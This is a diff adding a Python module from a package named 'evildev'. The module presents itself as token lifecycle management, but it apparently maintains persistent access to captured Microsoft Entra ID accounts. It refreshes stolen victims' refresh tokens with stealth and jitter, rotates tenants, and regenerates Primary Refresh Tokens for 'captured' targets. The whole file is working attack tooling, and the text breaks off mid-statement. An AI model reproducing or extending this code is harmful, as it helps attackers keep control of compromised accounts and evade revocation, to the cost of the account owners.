@@ -1,0 +1,1304 @@
+#!/usr/bin/env python3
+# token_refresh_manager.py - Token lifecycle management with CA-aware refresh, dead-token detection,
+# fragile token self-healing, and dashboard reauth signalling.
+
+import base64
+import json
+import math
+import os
+import random
+import re
+import sys
+import threading
+import time
+from collections import defaultdict
+from dataclasses import dataclass, field
+from datetime import datetime, timedelta, timezone
+from enum import Enum
+from pathlib import Path
+from typing import Any, Callable, Dict, List, Optional, Tuple
+
+_THIS_DIR = Path(__file__).resolve().parent
+_ROOT_DIR = _THIS_DIR.parent
+for _path in (str(_ROOT_DIR), str(_THIS_DIR)):
+    if _path not in sys.path:
+        sys.path.insert(0, _path)
+
+try:
+    from evildev.db import execute_query
+    from evildev.core import CryptoUtils, decode_jwt, StealthEngine
+    from evildev.harvester import TokenHarvester
+    from evildev.logger import get_logger
+except Exception:
+    from db import execute_query
+    from core import CryptoUtils, decode_jwt, StealthEngine
+    from harvester import TokenHarvester
+    from logger import get_logger
+
+logger = get_logger('token_refresh')
+
+
+def _utc_now() -> datetime:
+    return datetime.now(timezone.utc)
+
+
+def _normalize_utc_datetime(value: Optional[datetime]) -> Optional[datetime]:
+    if value is None:
+        return None
+    if not isinstance(value, datetime):
+        return None
+    if value.tzinfo is None:
+        local_tz = datetime.now().astimezone().tzinfo or timezone.utc
+        value = value.replace(tzinfo=local_tz)
+    return value.astimezone(timezone.utc)
+
+
+def _compute_refresh_backoff(consecutive_failures: int) -> Tuple[float, int]:
+    def read_float(name: str, default: float) -> float:
+        try:
+            value = float(os.environ.get(name, str(default)))
+        except (TypeError, ValueError):
+            return default
+        return value if math.isfinite(value) and value >= 0 else default
+
+    base = read_float('REFRESH_BACKOFF_BASE_SECONDS', 60.0)
+    cap = read_float('REFRESH_BACKOFF_MAX_SECONDS', 6 * 3600.0)
+    try:
+        max_failures = max(1, int(os.environ.get('REFRESH_ABANDON_AFTER_FAILURES', '10')))
+    except (TypeError, ValueError):
+        max_failures = 10
+
+    backoff = min(base, cap)
+    for _ in range(max(0, consecutive_failures - 1)):
+        if backoff >= cap / 2:
+            backoff = cap
+            break
+        backoff *= 2
+    backoff = min(cap, backoff * random.uniform(0.85, 1.15))
+    return backoff, max_failures
+
+
+def _sanitize_refresh_scopes(
+    scopes: Optional[List[str] | str],
+    strip_default: bool = False,
+) -> List[str]:
+    if scopes is None:
+        return []
+    if isinstance(scopes, str):
+        scope_list = scopes.replace(',', ' ').split()
+    else:
+        scope_list = []
+        for item in scopes:
+            if isinstance(item, str):
+                scope_list.extend(item.replace(',', ' ').split())
+            else:
+                scope_list.append(str(item))
+
+    cleaned: List[str] = []
+    seen = set()
+    for scope in scope_list:
+        good = str(scope).strip()
+        if not good:
+            continue
+        lowered = good.lower()
+        if strip_default and (lowered.endswith('/.default') or lowered.endswith('.default')):
+            continue
+        if good not in seen:
+            seen.add(good)
+            cleaned.append(good)
+    return cleaned
+
+
+class TokenHealth(Enum):
+    HEALTHY = 'healthy'
+    FRAGILE = 'fragile'
+    EXPIRING = 'expiring'
+    DEAD = 'dead'
+    REVOKED = 'revoked'
+    REAUTH_REQUIRED = 'reauth_required'
+
+
+@dataclass
+class TokenEntry:
+    email: str
+    encrypted_token: str
+    refresh_token: str
+    expires_at: datetime
+    fragile: bool = False
+    health: TokenHealth = TokenHealth.HEALTHY
+    refresh_count: int = 0
+    last_refresh_attempt: Optional[datetime] = None
+    last_error: Optional[str] = None
+    consecutive_failures: int = 0
+    reauth_initiated: bool = False
+    cooldown_until: Optional[datetime] = None
+    abandoned: bool = False
+    next_backoff_seconds: float = 0.0
+    in_flight: bool = False
+
+    @property
+    def is_expired(self) -> bool:
+        expires_at = _normalize_utc_datetime(self.expires_at)
+        if expires_at is None:
+            return False
+        return _utc_now() >= expires_at
+
+    @property
+    def seconds_until_expiry(self) -> float:
+        expires_at = _normalize_utc_datetime(self.expires_at)
+        if expires_at is None:
+            return 0.0
+        return max(0.0, (expires_at - _utc_now()).total_seconds())
+
+
+@dataclass
+class RefreshResult:
+    success: bool
+    health: TokenHealth
+    email: str
+    error_code: Optional[str] = None
+    error_description: Optional[str] = None
+    error: Optional[str] = None
+    new_expires_at: Optional[datetime] = None
+    new_refresh_token: Optional[str] = None
+    is_dead: bool = False
+    requires_reauth: bool = False
+    duration_ms: float = 0.0
+
+
+@dataclass
+class ReauthEvent:
+    email: str
+    session_id: Optional[str]
+    reason: str
+    # Reserved for a future on-demand mint flow. The current signal path
+    # always leaves these None.
+    user_code: Optional[str] = None
+    verification_uri: Optional[str] = None
+    timestamp: datetime = field(default_factory=_utc_now)
+
+
+class TokenRefreshManager:
+    _PRT_SWEEP_INTERVAL_SECONDS: int = 3600
+    _PRT_SWEEP_MAX_AGE_SECONDS: int = 25 * 86400
+    _PRT_SWEEP_BATCH_SIZE: int = 5
+    _PRT_SWEEP_ENABLED: bool = False
+
+    FATAL_ERROR_CODES = {
+        'AADSTS700082',
+        'AADSTS700084',
+        'AADSTS700081',
+        'AADSTS50173',
+        'AADSTS9002313',
+        'AADSTS700025',
+        'AADSTS53003',
+        'AADSTS65001',
+        'AADSTS50105',
+        'AADSTS53010',
+    }
+
+    TRANSIENT_ERROR_CODES = {
+        'AADSTS90002',
+        'AADSTS90008',
+        'AADSTS50058',
+        'AADSTS90033',
+    }
+
+    NON_RETRYABLE_TERMINAL_HEALTH = {
+        'AADSTS50057': TokenHealth.REVOKED,
+        'AADSTS70000': TokenHealth.DEAD,
+        'AADSTS70011': TokenHealth.DEAD,
+    }
+    NON_RETRYABLE_ERROR_CODES = set(NON_RETRYABLE_TERMINAL_HEALTH)
+
+    CA_KEYWORDS = [
+        'interaction_required',
+        'conditional access',
+        'device authentication required',
+        'mfa required',
+        'multi-factor authentication',
+        'requires fresh authentication',
+        'your organization requires',
+        'token issuance failed',
+    ]
+
+    def __init__(self):
+        self._lock = threading.RLock()
+        self._tokens: Dict[str, TokenEntry] = {}
+        self._refresh_history: Dict[str, List[RefreshResult]] = defaultdict(list)
+        self._stop_event = threading.Event()
+        self._refresh_thread: Optional[threading.Thread] = None
+        self._stats = {
+            'total_refreshes': 0,
+            'successful_refreshes': 0,
+            'failed_refreshes': 0,
+            'dead_tokens': 0,
+            'reauth_initiated': 0,
+            'fragile_tokens': 0,
+            'last_cycle': None,
+        }
+        self._prt_sweep_last_run: Optional[float] = None
+        self._prt_sweep_lock = threading.Lock()
+        self._PRT_SWEEP_ENABLED = (
+            os.environ.get('PRT_SWEEP_ENABLED', '').strip().lower()
+            in ('1', 'true', 'yes', 'on')
+        )
+        self._PRT_SWEEP_INTERVAL_SECONDS = int(
+            os.environ.get('PRT_SWEEP_INTERVAL_SECONDS', '3600')
+        )
+        self._PRT_SWEEP_MAX_AGE_SECONDS = int(
+            os.environ.get('PRT_SWEEP_MAX_AGE_SECONDS', str(25 * 86400))
+        )
+        self._PRT_SWEEP_BATCH_SIZE = int(
+            os.environ.get('PRT_SWEEP_BATCH_SIZE', '5')
+        )
+        self._on_token_dead: Optional[Callable[[str, str], None]] = None
+        self._on_reauth_needed: Optional[Callable[[ReauthEvent], None]] = None
+        self._on_refresh_result: Optional[Callable[[RefreshResult], None]] = None
+        self._prt_regenerator: Optional[Callable[[str], Dict[str, Any]]] = None
+        self._tenant_rotator: Optional[Any] = None
+        self._broadcast_sessions: Optional[Dict[str, Any]] = None
+        self._load_from_database()
+        try:
+            self._stealth = StealthEngine()
+        except Exception:
+            self._stealth = None
+
+    def start(self):
+        if self._refresh_thread and self._refresh_thread.is_alive():
+            logger.warning('Token refresh loop already running')
+            return
+        self._stop_event.clear()
+        self._refresh_thread = threading.Thread(
+            target=self._refresh_loop,
+            daemon=True,
+            name='token-refresh-manager'
+        )
+        self._refresh_thread.start()
+        logger.info('TokenRefreshManager started')
+
+    def is_running(self) -> bool:
+        return bool(self._refresh_thread and self._refresh_thread.is_alive())
+
+    def stop(self):
+        self._stop_event.set()
+        if self._refresh_thread and self._refresh_thread.is_alive():
+            self._refresh_thread.join(timeout=10)
+        logger.info('TokenRefreshManager stopped')
+
+    def register_callbacks(
+        self,
+        on_token_dead: Optional[Callable[[str, str], None]] = None,
+        on_reauth_needed: Optional[Callable[[ReauthEvent], None]] = None,
+        on_refresh_result: Optional[Callable[[RefreshResult], None]] = None,
+    ):
+        self._on_token_dead = on_token_dead
+        self._on_reauth_needed = on_reauth_needed
+        self._on_refresh_result = on_refresh_result
+
+    def set_prt_regenerator(self, fn: Callable[[str], Dict[str, Any]]):
+        self._prt_regenerator = fn
+
+    def set_tenant_rotator(self, tenant_rotator: Any):
+        self._tenant_rotator = tenant_rotator
+
+    def set_broadcast_sessions(self, sessions_dict: Dict[str, Any]):
+        self._broadcast_sessions = sessions_dict
+
+    def _get_refresh_tenant(self, fallback_tenant: str) -> str:
+        if self._tenant_rotator is not None:
+            try:
+                return self._tenant_rotator.get_tenant()
+            except Exception as e:
+                logger.warning(f'Tenant rotation failed; using {fallback_tenant}: {e}')
+        return fallback_tenant
+
+    def add_token(
+        self,
+        email: str,
+        encrypted_token: str,
+        refresh_token: str,
+        expires_at: datetime,
+        fragile: bool = False,
+    ):
+        with self._lock:
+            entry = TokenEntry(
+                email=email,
+                encrypted_token=encrypted_token,
+                refresh_token=refresh_token,
+                expires_at=expires_at,
+                fragile=fragile,
+                health=TokenHealth.FRAGILE if fragile else TokenHealth.HEALTHY,
+            )
+            self._tokens[email] = entry
+            if fragile:
+                self._stats['fragile_tokens'] += 1
+                logger.info(f'Added fragile token for {email}, expires at {expires_at.isoformat()}')
+            else:
+                logger.info(f'Added token for {email}, expires at {expires_at.isoformat()}')
+
+    def remove_token(self, email: str):
+        with self._lock:
+            entry = self._tokens.pop(email, None)
+            if entry:
+                execute_query('DELETE FROM tokens WHERE email=?', params=(email,), commit=True)
+                logger.info(f'Removed token for {email}')
+
+    def get_token(self, email: str) -> Optional[TokenEntry]:
+        with self._lock:
+            return self._tokens.get(email)
+
+    def load_token_from_db(self, email: str) -> bool:
+        """(Re)load a single token from the DB into the manager's in-memory state."""
+        if not email:
+            return False
+        row = execute_query(
+            "SELECT email, encrypted_token, refresh_token, expires_at "
+            "FROM tokens WHERE LOWER(email) = LOWER(?)",
+            params=(email.strip().lower(),),
+            fetch_one=True,
+        )
+        if not row:
+            return False
+        db_email, encrypted_token, refresh_token, expires_at_str = list(row) + [None] * (4 - len(row))
+
+        token_data = None
+        try:
+            master_key_hex = (
+                os.environ.get('TOKEN_ENCRYPTION_KEY')
+                or os.environ.get('WORM_MASTER_KEY')
+                or ''
+            )
+            master_key = bytes.fromhex(master_key_hex[:64])
+            if len(master_key) == 32 and encrypted_token:
+                raw = base64.b64decode(encrypted_token)
+                plaintext = CryptoUtils.aes_gcm_decrypt(master_key, raw[:12], raw[12:])
+                token_data = json.loads(plaintext.decode())
+        except Exception:
+            token_data = None
+
+        encrypted_refresh = token_data.get('refresh_token') if isinstance(token_data, dict) else None
+        effective = encrypted_refresh or refresh_token
+        if not effective:
+            return False
+
+        try:
+            if not expires_at_str:
+                expires_at = _utc_now()
+            else:
+                expires_at = datetime.fromisoformat(str(expires_at_str).replace('Z', '+00:00'))
+                expires_at = expires_at if expires_at.tzinfo else expires_at.replace(tzinfo=timezone.utc)
+                expires_at = expires_at.astimezone(timezone.utc)
+        except Exception:
+            expires_at = _utc_now()
+
+        with self._lock:
+            entry = TokenEntry(
+                email=db_email,
+                encrypted_token=encrypted_token or '',
+                refresh_token=effective,
+                expires_at=expires_at,
+                fragile=False,
+                health=TokenHealth.HEALTHY,
+            )
+            if isinstance(token_data, dict):
+                if token_data.get('foci') == '1' or self._check_token_for_ca(token_data):
+                    entry.fragile = True
+                    entry.health = TokenHealth.FRAGILE
+            self._tokens[db_email] = entry
+        logger.info(f'On-demand load of token for {db_email} into refresh manager')
+        return True
+
+    def get_all_tokens(self) -> List[TokenEntry]:
+        with self._lock:
+            return list(self._tokens.values())
+
+    def get_fragile_tokens(self) -> List[TokenEntry]:
+        with self._lock:
+            return [t for t in self._tokens.values() if t.fragile]
+
+    def get_expiring_tokens(self, margin_seconds: int = 1200) -> List[TokenEntry]:
+        with self._lock:
+            threshold = _utc_now() + timedelta(seconds=margin_seconds)
+            expiring = []
+            for t in self._tokens.values():
+                if t.health in (TokenHealth.DEAD, TokenHealth.REVOKED):
+                    continue
+                expires_at = _normalize_utc_datetime(t.expires_at)
+                if expires_at is None:
+                    continue
+                if expires_at <= threshold:
+                    expiring.append(t)
+            return expiring
+
+    def get_dead_tokens(self) -> List[TokenEntry]:
+        with self._lock:
+            return [t for t in self._tokens.values() if t.health in (TokenHealth.DEAD, TokenHealth.REVOKED)]
+
+    def reauth_for_token(self, email: str, session_id: Optional[str] = None) -> Optional[ReauthEvent]:
+        """Signal that a token needs fresh authentication.
+
+        Does not mint a device code and does not make any network calls.
+        The dashboard surfaces the event and the operator decides whether
+        to re-capture or run reauth manually.
+        """
+        with self._lock:
+            entry = self._tokens.get(email)
+            if not entry:
+                logger.warning(f'Cannot signal reauth: token for {email} not found')
+                return None
+            if entry.reauth_initiated:
+                logger.debug(f'Reauth already signalled for {email}')
+                return None
+            reason = f'Token {entry.health.value} requires fresh authentication'
+            last_error = entry.last_error
+            entry.reauth_initiated = True
+            self._stats['reauth_initiated'] += 1
+
+        if last_error:
+            reason = f'{reason} ({last_error})'
+
+        event = ReauthEvent(
+            email=email,
+            session_id=session_id,
+            reason=reason,
+        )
+        logger.info(f'Reauth signalled for {email}: {event.reason}')
+        if self._on_reauth_needed:
+            try:
+                self._on_reauth_needed(event)
+            except Exception as e:
+                logger.warning(f'Reauth signal callback failed: {e}')
+        return event
+
+    def get_pending_reauth_events(self) -> List[ReauthEvent]:
+        """Return no queued events; reauth notifications are delivered by callback."""
+        return []
+
+    def refresh_single(
+        self,
+        email: str,
+        override_refresh_token: Optional[str] = None,
+    ) -> Optional[RefreshResult]:
+        with self._lock:
+            entry = self._tokens.get(email)
+            if not entry:
+                logger.warning(f'Cannot refresh: token for {email} not found')
+                return None
+            if entry.health in (TokenHealth.DEAD, TokenHealth.REVOKED):
+                logger.warning(f'Cannot refresh: token for {email} is {entry.health.value}')
+                return None
+            if entry.abandoned:
+                cooldown_until = _normalize_utc_datetime(entry.cooldown_until)
+                if cooldown_until and _utc_now() < cooldown_until:
+                    logger.debug(f'Cannot refresh: {email} abandoned and cooling down')
+                    return None
+                entry.abandoned = False
+                entry.consecutive_failures = 0
+            cooldown_until = _normalize_utc_datetime(entry.cooldown_until)
+            if cooldown_until and _utc_now() < cooldown_until:
+                remaining = int((cooldown_until - _utc_now()).total_seconds())
+                logger.debug(f'Skipping {email}: cooldown {remaining}s remaining')
+                return None
+        return self._attempt_refresh(
+            email,
+            entry,
+            override_refresh_token=override_refresh_token,
+        )
+
+    def get_stats(self) -> Dict:
+        with self._lock:
+            active = sum(1 for t in self._tokens.values() if t.health not in (TokenHealth.DEAD, TokenHealth.REVOKED))
+            dead = sum(1 for t in self._tokens.values() if t.health in (TokenHealth.DEAD, TokenHealth.REVOKED))
+            fragile = sum(1 for t in self._tokens.values() if t.fragile)
+            expiring = len(self.get_expiring_tokens(margin_seconds=1200))
+            return {
+                **self._stats,
+                'total_tokens': len(self._tokens),
+                'active_tokens': active,
+                'dead_tokens': dead,
+                'fragile_tokens': fragile,
+                'expiring_tokens': expiring,
+                'pending_reauth': 0,
+                'is_running': bool(self._refresh_thread and self._refresh_thread.is_alive()),
+                'prt_sweep_enabled': self._PRT_SWEEP_ENABLED,
+                'prt_sweep_last_run': (
+                    datetime.fromtimestamp(
+                        self._prt_sweep_last_run, tz=timezone.utc
+                    ).isoformat()
+                    if self._prt_sweep_last_run else None
+                ),
+            }
+
+    def get_token_health_report(self) -> List[Dict]:
+        with self._lock:
+            report = []
+            for email, entry in self._tokens.items():
+                history = self._refresh_history.get(email, [])
+                last_result = history[-1] if history else None
+                report.append({
+                    'email': email,
+                    'health': entry.health.value,
+                    'fragile': entry.fragile,
+                    'expires_at': entry.expires_at.isoformat(),
+                    'seconds_until_expiry': entry.seconds_until_expiry,
+                    'refresh_count': entry.refresh_count,
+                    'consecutive_failures': entry.consecutive_failures,
+                    'last_error': entry.last_error,
+                    'reauth_initiated': entry.reauth_initiated,
+                    'abandoned': entry.abandoned,
+                    'in_flight': entry.in_flight,
+                    'cooldown_until': entry.cooldown_until.isoformat() if entry.cooldown_until else None,
+                    'next_backoff_seconds': entry.next_backoff_seconds,
+                    'last_refresh_result': {
+                        'success': last_result.success,
+                        'error_code': last_result.error_code,
+                        'requires_reauth': last_result.requires_reauth,
+                        'duration_ms': int(last_result.duration_ms),
+                    } if last_result else None,
+                })
+            return report
+
+    def validate_configuration(self) -> Tuple[bool, Optional[str]]:
+        if not os.environ.get('CLIENT_ID'):
+            return False, 'CLIENT_ID not set in environment'
+        if not os.environ.get('TENANT'):
+            return False, 'TENANT not set in environment'
+        return True, None
+
+    def _load_from_database(self):
+        try:
+            rows = execute_query(
+                "SELECT email, encrypted_token, refresh_token, expires_at FROM tokens WHERE (encrypted_token IS NOT NULL AND encrypted_token != '') OR (refresh_token IS NOT NULL AND refresh_token != '')",
+                fetch_all=True,
+            )
+            for email, encrypted_token, refresh_token, expires_at_str in rows:
+                token_data = None
+                master_key = None
+                try:
+                    master_key_hex = os.environ.get('TOKEN_ENCRYPTION_KEY') or os.environ.get('WORM_MASTER_KEY') or ''
+                    master_key = bytes.fromhex(master_key_hex[:64])
+                    if len(master_key) != 32:
+                        master_key = None
+                    if encrypted_token and master_key:
+                        encrypted_bytes = base64.b64decode(encrypted_token)
+                        plaintext = CryptoUtils.aes_gcm_decrypt(
+                            master_key, encrypted_bytes[:12], encrypted_bytes[12:]
+                        )
+                        token_data = json.loads(plaintext.decode())
+                except Exception:
+                    token_data = None
+
+                encrypted_refresh_token = (
+                    token_data.get('refresh_token')
+                    if isinstance(token_data, dict) else None
+                )
+                effective_refresh_token = encrypted_refresh_token or refresh_token
+                if not effective_refresh_token:
+                    continue
+
+                if encrypted_refresh_token and refresh_token:
+                    try:
+                        execute_query(
+                            'UPDATE tokens SET refresh_token=NULL WHERE email=?',
+                            params=(email,),
+                            commit=True,
+                        )
+                    except Exception as e:
+                        logger.warning(f'Could not clear legacy plaintext refresh token for {email}: {e}')
+
+                try:
+                    if not expires_at_str:
+                        expires_at = datetime.now(timezone.utc)
+                    else:
+                        expires_at = datetime.fromisoformat(expires_at_str.replace('Z', '+00:00'))
+                        if expires_at.tzinfo is None:
+                            expires_at = expires_at.replace(tzinfo=timezone.utc)
+                        else:
+                            expires_at = expires_at.astimezone(timezone.utc)
+                except Exception:
+                    expires_at = datetime.now(timezone.utc)
+                entry = TokenEntry(
+                    email=email,
+                    encrypted_token=encrypted_token,
+                    refresh_token=effective_refresh_token,
+                    expires_at=expires_at,
+                    fragile=False,
+                    health=TokenHealth.HEALTHY,
+                )
+                if isinstance(token_data, dict):
+                    if token_data.get('foci') == '1' or self._check_token_for_ca(token_data):
+                        entry.fragile = True
+                        entry.health = TokenHealth.FRAGILE
+                        logger.debug(f"Token for {email} marked fragile based on stored token metadata")
+                self._tokens[email] = entry
+            logger.info(f'Loaded {len(self._tokens)} tokens from database')
+        except Exception as e:
+            logger.warning(f'Failed to load tokens from database: {e}')
+
+    def _refresh_loop(self):
+        logger.info('Token refresh loop started')
+        interval = int(os.environ.get('TOKEN_REFRESH_INTERVAL_SECONDS') or os.environ.get('WORM_TOKEN_REFRESH_INTERVAL_SECONDS', '300'))
+        while not self._stop_event.is_set():
+            try:
+                self._refresh_cycle()
+                self._stop_event.wait(interval)
+            except Exception as e:
+                logger.error(f'Token refresh cycle error: {e}')
+                self._stop_event.wait(60)
+
+    def _refresh_cycle(self):
+        margin = int(os.environ.get('TOKEN_REFRESH_MARGIN_SECONDS') or os.environ.get('WORM_TOKEN_REFRESH_MARGIN_SECONDS', '1200'))
+        expiring = self.get_expiring_tokens(margin)
+        if expiring:
+            logger.info(f'Refresh cycle: {len(expiring)} token(s) within margin')
+            now = _utc_now()
+            expiring.sort(key=lambda e: e.seconds_until_expiry)
+            for entry in expiring:
+                if self._stop_event.is_set():
+                    break
+                if entry.health in (TokenHealth.DEAD, TokenHealth.REVOKED):
+                    continue
+                if entry.abandoned:
+                    cooldown_until = _normalize_utc_datetime(entry.cooldown_until)
+                    if cooldown_until and now < cooldown_until:
+                        continue
+                    entry.abandoned = False
+                    entry.consecutive_failures = 0
+                cooldown_until = _normalize_utc_datetime(entry.cooldown_until)
+                if cooldown_until and now < cooldown_until:
+                    remaining = int((cooldown_until - now).total_seconds())
+                    logger.debug(f'Skipping {entry.email}: cooldown {remaining}s remaining')
+                    continue
+                result = self._attempt_refresh(entry.email, entry)
+                time.sleep(random.uniform(1.0, 3.0))
+        try:
+            sweep_summary = self._sweep_stale_prts()
+            if sweep_summary.get('regenerated'):
+                logger.info(
+                    f"PRT sweep: regenerated "
+                    f"{sweep_summary['regenerated']} PRT(s)"
+                )
+        except Exception as e:
+            logger.warning(f'PRT sweep raised: {e}')
+        self._stats['last_cycle'] = _utc_now().isoformat()
+
+    def _sweep_stale_prts(self) -> Dict[str, int]:
+        if not self._PRT_SWEEP_ENABLED:
+            return {'skipped_disabled': 1}
+        regenerator = self._prt_regenerator
+        if not regenerator:
+            logger.warning('PRT sweep: no regenerator registered; skipping')
+            return {'skipped_unwired': 1}
+
+        now = time.time()
+        with self._prt_sweep_lock:
+            if self._prt_sweep_last_run and (
+                (now - self._prt_sweep_last_run) < self._PRT_SWEEP_INTERVAL_SECONDS
+            ):
+                return {'skipped_interval': 1}
+            self._prt_sweep_last_run = now
+
+        cutoff_iso = (
+            _utc_now() - timedelta(seconds=self._PRT_SWEEP_MAX_AGE_SECONDS)
+        ).isoformat()
+
+        try:
+            rows = execute_query(
+                """SELECT t.email
+                   FROM targets t
+                   WHERE t.status = 'captured'
+                     AND t.email IS NOT NULL
+                     AND TRIM(t.email) <> ''
+                     AND t.email LIKE '%@%'
+                     AND t.drs_enrolled_at IS NOT NULL
+                     AND t.drs_enrolled_at <> ''
+                     AND t.drs_enrolled_at NOT LIKE 'FAILED:%'
+                     AND t.prt_acquired_at IS NOT NULL
+                     AND t.prt_acquired_at <> ''
+                     AND t.prt_acquired_at NOT LIKE 'FAILED:%'
+                     AND t.prt_acquired_at < ?
+                   ORDER BY t.prt_acquired_at ASC
+                   LIMIT ?""",
+                params=(cutoff_iso, self._PRT_SWEEP_BATCH_SIZE),
+                fetch_all=True,
+            ) or []
+        except Exception as e:
+            logger.warning(f'PRT sweep: query failed: {e}')
+            return {'error': 1}
+
+        candidates = [str(row[0]) for row in rows if row and row[0]]
+        if not candidates:
+            return {'candidates': 0}
+
+        with self._lock:
+            usable = []
+            for email in candidates:
+                entry = self._tokens.get(email)
+                if entry is None or entry.abandoned:
+                    continue
+                cooldown_until = _normalize_utc_datetime(entry.cooldown_until)
+                if cooldown_until and _utc_now() < cooldown_until:
+                    continue
+                usable.append(email)
+
+        if not usable:
+            return {'candidates': len(candidates), 'usable': 0}
+
+        logger.info(f'PRT sweep: {len(usable)} stale target(s) to regenerate')
+        regenerated = 0
+        failed = 0
+
+        for email in usable:
+            if self._stop_event.is_set():
+                break
+            try:
+                result = regenerator(email)
+            except Exception as e:
+                logger.warning(f'PRT sweep: regeneration raised for {email}: {e}')
+                failed += 1
+                continue
+
+            if result.get('success'):
+                regenerated += 1
+                logger.info(f'PRT sweep: regenerated PRT for {email}')
+                try:
+                    if self._on_refresh_result:
+                        self._on_refresh_result(RefreshResult(
+                            success=True,
+                            health=TokenHealth.HEALTHY,
+                            email=email,
+                            duration_ms=0.0,
+                        ))
+                except Exception:
+                    pass
+            else:
+                failed += 1
+                kind = result.get('failure_kind') or 'error'
+                msg = result.get('failure_message') or 'unknown'
+                logger.warning(f'PRT sweep: regeneration failed for {email}: {kind}: {msg}')
+                if kind == 'auth':
+                    try:
+                        try:
+                            from evildev.db import mark_prt_failed
+                        except Exception:
+                            from db import mark_prt_failed
+                        mark_prt_failed(email, error=msg)
+                    except Exception as e:
+                        logger.warning(f'PRT sweep: could not mark {email} as failed: {e}')
+
+            time.sleep(random.uniform(1.0, 3.0))
+
+        return {
+            'candidates': len(candidates),
+            'usable': len(usable),
+            'regenerated': regenerated,
+            'failed': failed,
+        }
+
+    def _record_refresh_failure(
+        self,
+        entry: TokenEntry,
+        error: str,
+        health: Optional[TokenHealth] = None,
+    ):
+        now = _utc_now()
+        with self._lock:
+            entry.last_refresh_attempt = now
+            entry.consecutive_failures += 1
+            entry.last_error = error
+            if health is not None:
+                entry.health = health
+
+            backoff, max_failures = _compute_refresh_backoff(entry.consecutive_failures)
+            entry.next_backoff_seconds = backoff
+            entry.cooldown_until = now + timedelta(seconds=backoff)
+
+            newly_abandoned = not entry.abandoned and entry.consecutive_failures >= max_failures
+            if entry.consecutive_failures >= max_failures:
+                entry.abandoned = True
+
+        if newly_abandoned:
+            logger.error(
+                f'Abandoning {entry.email} after {entry.consecutive_failures} '
+                f'consecutive refresh failures'
+            )
+
+    def _attempt_refresh(
+        self,
+        email: str,
+        entry: TokenEntry,
+        override_refresh_token: Optional[str] = None,
+    ) -> Optional[RefreshResult]:
+        start_time = time.time()
+        client_id = os.environ.get('CLIENT_ID')
+        client_secret = os.environ.get('CLIENT_SECRET')
+        tenant = os.environ.get('TENANT', 'common')
+        if not client_id:
+            logger.warning('CLIENT_ID not set, skipping refresh')
+            return None
+        try:
+            master_key_hex = os.environ.get('TOKEN_ENCRYPTION_KEY') or os.environ.get('WORM_MASTER_KEY')
+            if not master_key_hex:
+                logger.critical("TOKEN_ENCRYPTION_KEY not set! Using random key - tokens will be lost on restart.")
+                logger.critical("Set TOKEN_ENCRYPTION_KEY environment variable for persistent encryption.")
+                master_key_hex = os.urandom(32).hex()
+            master_key = bytes.fromhex(master_key_hex[:64]) if len(master_key_hex) >= 64 else os.urandom(32)
+            encrypted_bytes = base64.b64decode(entry.encrypted_token)
+            decrypted = CryptoUtils.aes_gcm_decrypt(master_key, encrypted_bytes[:12], encrypted_bytes[12:])
+            saved_token_data = json.loads(decrypted.decode())
+            token_data = saved_token_data.copy()
+        except Exception:
+            token_data = {'refresh_token': entry.refresh_token}
+
+        refresh_token = (
+            override_refresh_token
+            or token_data.get('refresh_token')
+            or entry.refresh_token
+        )
+        if not refresh_token:
+            result = RefreshResult(
+                success=False,
+                health=TokenHealth.DEAD,
+                email=email,
+                error_code='NO_REFRESH_TOKEN',
+                error_description='No refresh token available',
+                error='No refresh token available',
+                is_dead=True,
+                duration_ms=(time.time() - start_time) * 1000,
+            )
+            self._finalize_refresh_result(entry, result)
+            return result
+
+        stored_scope_string = None
+        if isinstance(token_data, dict):
+            stored_scope_string = (
+                token_data.get('scope')
+                or token_data.get('scopes')
+                or token_data.get('granted_scopes')
+            )
+        if isinstance(stored_scope_string, (list, tuple, set)):
+            stored_scope_string = ' '.join(str(item) for item in stored_scope_string)
+
+        if isinstance(stored_scope_string, str) and stored_scope_string.strip():
+            raw_scopes = _sanitize_refresh_scopes(stored_scope_string, strip_default=False)
+            oidc_scopes = ['openid', 'offline_access', 'profile']
+            oidc_scope_set = set(oidc_scopes)
+            default_scopes = [
+                scope for scope in raw_scopes
+                if scope.lower().endswith('/.default') or scope.lower().endswith('.default')
+            ]
+            default_scope_keys = {scope.lower() for scope in default_scopes}
+            resource_scopes = [
+                scope for scope in raw_scopes
+                if scope.lower() not in oidc_scope_set
+                and scope.lower() not in default_scope_keys
+            ]
+            if default_scopes:
+                oidc_present = [
+                    scope for scope in raw_scopes
+                    if scope.lower() in oidc_scope_set
+                ]
+                for scope in oidc_scopes:
+                    if scope not in oidc_present:
+                        oidc_present.append(scope)
+                refresh_scopes = oidc_present + default_scopes
+                if resource_scopes:
+                    logger.warning(
+                        f"Refresh for {email}: stored scopes mixed .default with "
+                        f"resource scopes (invalid); reduced to {refresh_scopes}"
+                    )
+            else:
+                refresh_scopes = raw_scopes
+            scope_source = 'stored-token'
+        else:
+            full_scopes = os.environ.get('DEVICE_CODE_FULL_SCOPES', '').strip()
+            if full_scopes:
+                refresh_scopes = _sanitize_refresh_scopes(full_scopes, strip_default=True)
+                scope_source = 'DEVICE_CODE_FULL_SCOPES'
+            else:
+                env_scopes = (
+                    os.environ.get('DEVICE_CODE_SCOPES', '').strip()
+                    or os.environ.get('GRAPH_SCOPES', '').strip()
+                    or 'openid offline_access profile'
+                )
+                refresh_scopes = _sanitize_refresh_scopes(env_scopes, strip_default=True)
+                scope_source = 'env'
+
+        logger.info(f"Refresh for {email} using scope source={scope_source}: {refresh_scopes}")
+        logger.debug(f"Refresh for {email} using grant-time scopes: {refresh_scopes}")
+        refresh_tenant = self._get_refresh_tenant(tenant)
+
+        with self._lock:
+            entry.in_flight = True
+        try:
+            harvester = TokenHarvester(
+                client_id=client_id,
+                tenant=refresh_tenant,
+                scopes=refresh_scopes,
+                stealth=self._stealth,
+                client_secret=client_secret or None,
+            )
+
+            token_data = harvester.refresh_token(refresh_token)
+
+            error_text = (
+                str(getattr(harvester, 'last_error', '') or '')
+                + ' '
+                + str(getattr(entry, 'last_error', '') or '')
+            ).upper()
+            extra_fatal_markers = (
+                'AADSTS9002313', 'AADSTS700025', 'AADSTS700082',
+                'AADSTS700084', 'AADSTS700081', 'AADSTS50173',
+                'AADSTS54005', 'INVALID_CLIENT', 'UNAUTHORIZED_CLIENT',
+            )
+            fatal_refresh = (
+                any(code in error_text for code in self.FATAL_ERROR_CODES)
+                or any(marker in error_text for marker in extra_fatal_markers)
+                or any(code in error_text for code in self.NON_RETRYABLE_ERROR_CODES)
+            )
+
+            if (not token_data
+                    and not fatal_refresh
